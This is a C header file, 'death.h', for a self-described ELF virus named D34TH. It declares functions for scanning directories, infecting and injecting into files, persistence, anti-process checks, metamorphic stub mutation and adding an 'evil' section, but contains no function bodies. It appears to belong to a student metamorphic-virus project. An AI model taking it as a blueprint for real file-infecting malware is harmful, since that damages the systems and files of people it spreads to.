#ifndef DEATH_H
#define DEATH_H

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <stdint.h>
#include <string.h>
#include <elf.h>
#include <errno.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <linux/memfd.h>
#include <sys/mman.h>
#include <ctype.h>
#include <inttypes.h>

#define SIGNATURE "D34TH version 1.0 (c)oded by marcheva-dedavid - [00000000]"
#define SIGNATURE_LEN (sizeof(SIGNATURE) - 1)
#define SIGNATURE_BASIC "D34TH version 1.0 (c)oded by marcheva-dedavid - "
#define SIGNATURE_BASIC_LEN (sizeof(SIGNATURE_BASIC) - 1)
#define FP_LEN 8
#define FP_OFFSET (SIGNATURE_LEN - 1  - 1 - FP_LEN)
#define FP_BLOCK_LEN (1 + FP_LEN + 1)
#define SIGNATURE_TOTAL_LEN (SIGNATURE_BASIC_LEN + 1 + FP_LEN + 1 + 1)

typedef enum {
	FT_UNKNOWN,
	FT_ELF,
	FT_PNG,
	FT_JPEG,
	FT_GIF,
	FT_PDF,
	FT_ZIP,
	FT_BMP,
	FT_TEXT
} file_type_t;


typedef struct {
	file_type_t         type;
	size_t              offset;
	const unsigned char *magic;
	size_t              length;
} magic_rule_t;

void        	death(void);
unsigned char	get_seed(char *path);
void        	scan_dir(char *path);
file_type_t 	detect_file(const char *path);
int         	ready_infect(char *path);
void        	inject(char *path);
int         	anti_process(char *path);
void        	persistence();
off_t			vaddr_to_file_offset(int fd, uint64_t vaddr);
off_t			find_signature_offset(int fd);
void			metamorphe(size_t stub_size,unsigned char *stub, unsigned char seed);
int				add_evil_section(char *path,unsigned char *stub, size_t stub_len);

#endif